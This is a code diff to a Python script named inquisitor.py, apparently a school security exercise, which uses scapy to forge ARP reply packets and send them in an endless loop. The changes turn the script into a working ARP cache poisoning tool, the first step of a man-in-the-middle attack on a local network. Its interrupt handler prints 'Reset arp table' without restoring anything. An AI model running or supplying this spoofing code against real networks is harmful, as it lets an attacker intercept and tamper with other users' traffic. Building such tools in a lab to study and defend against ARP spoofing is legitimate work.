@@ -12,7 +12,7 @@
 #                                                                              #
 # **************************************************************************** #
 
-from scapy.all import ARP, Ether
+from scapy.all import ARP, Ether, sendp, sniff
 import argparse
 import sys, os
 
@@ -48,6 +48,7 @@ def create_arppkt(IP_src: str, MAC_src: str, IP_target: str, MAC_target: str):
 	packet = ARP()
 	packet.hwlen = 6
 	packet.plen = 4
+	packet.op = 2
 	try:
 		packet.hwsrc = MAC_src
 		packet.psrc = IP_src
@@ -59,9 +60,22 @@ def create_arppkt(IP_src: str, MAC_src: str, IP_target: str, MAC_target: str):
 	arppckt = trame / packet
 	return arppckt
 
+def send_packet(arppkt):
+	while True:
+		try:
+			sendp(arppkt)
+		except PermissionError as error:
+			print(f"inquisitor.py: error: {error}")
+			exit(1)
+		except KeyboardInterrupt:
+			print(f"Reset arp table")
+			return
+
+
 def inquisitor(IP_src: str, MAC_src: str, IP_target: str, MAC_target: str):
 	arppkt = create_arppkt(IP_src, MAC_src, IP_target, MAC_target)
 	arppkt.show()
+	send_packet(arppkt)
 
 if __name__ == "__main__":
 	args = parse_arguments()
